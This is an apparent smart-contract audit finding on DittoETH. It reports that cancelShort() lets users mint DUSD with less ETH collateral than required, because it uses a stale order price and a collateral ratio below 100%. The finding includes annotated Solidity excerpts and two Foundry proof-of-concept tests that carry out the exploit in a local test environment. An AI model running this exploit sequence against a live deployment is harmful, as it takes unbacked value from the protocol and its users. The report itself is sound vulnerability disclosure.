## [H] `DUSD` assets can be minted with less `ETH` collateral than required

### Summary

I discovered that the current implementation has not fixed the issue [H-03 (Users can mint DUSD with less collateral than required which gives them free DUSD and may open a liquidatable position)](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/134) raised in the previous C4 audit.

### Description

To mint the `DUSD` assets with less collateral than required, a user or attacker executes the `OrdersFacet::cancelShort()` to cancel the `shortOrder` with its `shortRecord.ercDebt` < `minShortErc` (i.e., `shortRecord.status` == `SR.PartialFill`).

The `OrdersFacet::cancelShort()` will [execute another internal function, `LibOrders::cancelShort()`](repos/2024-07-dittoeth/contracts/facets/OrdersFacet.sol#L60) (`@1` in the snippet below), to do the short canceling job. If the `shortOrder`'s corresponding `shortRecord.status` == `SR.PartialFill` and has `shortRecord.ercDebt` < `minShortErc`, the steps [`@2.1`](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L944) and [`@2.2`](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L946) will get through.

Since the `shortRecord` is less than the `minShortErc`, the `cancelShort()` has to fill an `ercDebt` for more to reach the `minShortErc` threshold (so that the partially filled `shortRecord.ercDebt` will == `minShortErc`). Specifically, the function has to virtually mint the `DUSD` assets to increase the `ercDebt` by spending the `shortRecord.collateral` (Let's name it the `collateralDiff`) for exchange.

Here, we come to the root cause in [`@3`](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L953). To calculate the `collateralDiff`:

1.  The `shortOrder.price` is used instead of the current price. Nevertheless, the `shortOrder.price` can be stale (less or higher than the current price).
2.  The `shortOrder.shortOrderCR` (i.e., the `cr` variable in the snippet below) is used, which can be less than 100% CR.

If the `shortOrder.price` is less than the current price and/or the `shortOrder.shortOrderCR` is less than 100% CR, the calculated `collateralDiff` will have a value less than the value of the `DUSD` assets that get minted ([`@4`](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L960)).

```solidity
    // FILE: [contracts/facets/OrdersFacet.sol](repos/2024-07-dittoeth/contracts/facets/OrdersFacet.sol)
    function cancelShort(address asset, uint16 id) external onlyValidAsset(asset) nonReentrant {
        STypes.Order storage short = s.shorts[asset][id];
        if (msg.sender != short.addr) revert Errors.NotOwner();
        if (short.orderType != O.LimitShort) revert Errors.NotActiveOrder();

        //@audit @1 -- Execute the cancelShort() to cancel the shortOrder with
        //             its shortRecord.ercDebt < minShortErc (SR.PartialFill).
@1      LibOrders.cancelShort(asset, id);
    }

    // FILE: [contracts/libraries/LibOrders.sol](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol)
    function cancelShort(address asset, uint16 id) internal {
        ...

        if (shortRecord.status == SR.Closed) {
            ...
@2.1    } else { //@audit @2.1 -- shortRecord.status == SR.PartialFill

            uint256 minShortErc = LibAsset.minShortErc(Asset);
@2.2        if (shortRecord.ercDebt < minShortErc) { //@audit @2.2 -- shortRecord.ercDebt < minShortErc

                // @dev prevents leaving behind a partially filled SR under minShortErc
                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
                {
                    STypes.Vault storage Vault = s.vault[vault];

                    //@audit @3 -- To calculate the collateralDiff:
                    //             1) The shortOrder.price is used instead of the current price.
                    //                 -> The shortOrder.price can be stale (less or higher than the current price).
                    //
                    //             2) The shortOrder.shortOrderCR (i.e., cr) is used, which can be less than 100% CR.
@3                  uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);

                    LibShortRecord.fillShortRecord(
                        asset,
                        shorter,
                        shortRecordId,
                        SR.FullyFilled,
@4                      collateralDiff, //@audit @4 -- The collateralDiff's value can be less than the value of the DUSD assets that get minted.
                        debtDiff,
                        Asset.ercDebtRate,
                        Vault.dethYieldRate,
                        0
                    );

                    Vault.dethCollateral += collateralDiff;
                    Asset.dethCollateral += collateralDiff;
                    Asset.ercDebt += debtDiff;

                    // @dev update the eth refund amount
                    eth -= collateralDiff;
                }
                // @dev virtually mint the increased debt
                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
            } else {
                ...
            }
        }

        ...
    }
```

*   `@1`: [contracts/facets/OrdersFacet.sol#L60](repos/2024-07-dittoeth/contracts/facets/OrdersFacet.sol#L60)
*   `@2.1`: [contracts/libraries/LibOrders.sol#L944](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L944)
*   `@2.2`: [contracts/libraries/LibOrders.sol#L946](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L946)
*   `@3`: [contracts/libraries/LibOrders.sol#L953](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L953)
*   `@4`: [contracts/libraries/LibOrders.sol#L960](repos/2024-07-dittoeth/contracts/libraries/LibOrders.sol#L960)

### Impact

Users or attackers can mint the `DUSD` assets with less `ETH` collateral than required (i.e., free money). This vulnerability is critical and can lead to the de-pegging of the `DUSD` token.

### Proof of Concept

This section provides a coded PoC.

Place the `test_MintFreeDUSD()` and `test_MintBelowPrice()` in the `.test/Shorts.t.sol` file and declare the following `import` directive at the top of the test file: `import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";`.

There are two test functions. Execute the commands:

1.  `forge test -vv --mt test_MintFreeDUSD`
2.  `forge test -vv --mt test_MintBelowPrice`

`PoC #1` shows we can mint the free `DUSD` by canceling the `shortOrder` with the `shortOrderCR` < 100%. For `PoC #2`, we can mint the free `DUSD` by canceling the `shortOrder` with the `price` < the current price.

*Note: in the current codebase, the developer has improved how to source more collateral if the `CR` < `initialCR` in the `createLimitShort()`. For this reason, I had to modify the original test functions developed by `nonseodion` to make them work again. Thanks to `nonseodion`.*

```solidity
// Require: import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintFreeDUSD() public { // PoC #1
    // Set the initial, penalty and liquidation CRs
    vm.startPrank(owner);
    // Set below 200 to allow shorter provide less than 100% of debt
    diamond.setInitialCR(asset, 170);
    diamond.setPenaltyCR(asset, 120);
    diamond.setLiquidationCR(asset, 150);
    vm.stopPrank();

    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // How to calculate the ethInitial:
    //      minEth = price.mul(minShortErc);
    //      diffCR = initialCR - CR;
    //      ethInitial = minEth.mul(diffCR);
    uint88 ethInitial = 2000 ether;

    // Create the short providing only 70% of the dusd to be minted
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether) + ethInitial);
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    // Successfully matches the bid
    assertTrue(short.status == SR.PartialFill);

    // Cancel the short to use up collateral provided and mint dusd
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether + ethInitial); // 70% of ETH collateral provided

    // The position is no longer liquidatable because the developer has improved
    // how to source more collateral if CR < initialCR in the createLimitShort().
    // However, we can still use the CR of 70% to calculate the collateral
    // whose value is less than the value of DUSD that gets minted.
}

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintBelowPrice() public { // PoC #2
    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // Create the short providing 500% of the dusd to be minted
    // Current initialCR is 500%
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(5 ether));
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 500);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid

    // Set the new price to 1.5 ether so that price increase
    uint256 newPrice = 1.5 ether;
    skip(15 minutes);
    ethAggregator.setRoundData(
        92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
    );
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);
    assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);

    // Cancel the short to mint at 1 ether instead of 1.5 ether
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    // 2000 dusd minted for 10000 ether (500% at price of 1 ether)
    // instead of 15000 ether (500% at price of 1.5 ether)
    assertEq(short.collateral, 0.01 ether + 5*2000 ether);

    // Position is liquidatable
    assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
}
```





